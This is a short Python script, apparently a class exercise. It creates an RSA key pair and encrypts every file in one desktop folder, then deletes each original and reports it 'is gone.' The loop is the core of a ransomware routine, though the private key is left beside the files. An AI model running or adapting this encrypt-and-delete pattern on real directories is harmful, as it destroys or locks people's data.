import os
from workspace.EncryptThenMAC import MyencryptMAC,MydecryptMAC,MyfileEncryptMAC,MyfileDecryptMAC,MyRSAEncryptMAC,MyRSADecryptMAC,GenerateRSAKeyPair
GenerateRSAKeyPair("C:\\Users\\Kevin\\Desktop\\Work\\RSA_Publickey.pem", "C:\\Users\\Kevin\\Desktop\\Work\\RSA_Privatekey.pem")
fileList = os.listdir("C:\\Users\\Kevin\\Desktop\\Work")
for i in [x for x in fileList if x != "RSA_Privatekey.pem" and x != "RSA_Publickey.pem"]:
	MyRSAEncryptMAC("C:\\Users\\Kevin\\Desktop\\Work\\"+i,"C:\\Users\\Kevin\\Desktop\\Work\\RSA_Publickey.pem")
	os.remove("C:\\Users\\Kevin\\Desktop\\Work\\"+i)
	print(i,"is gone.")
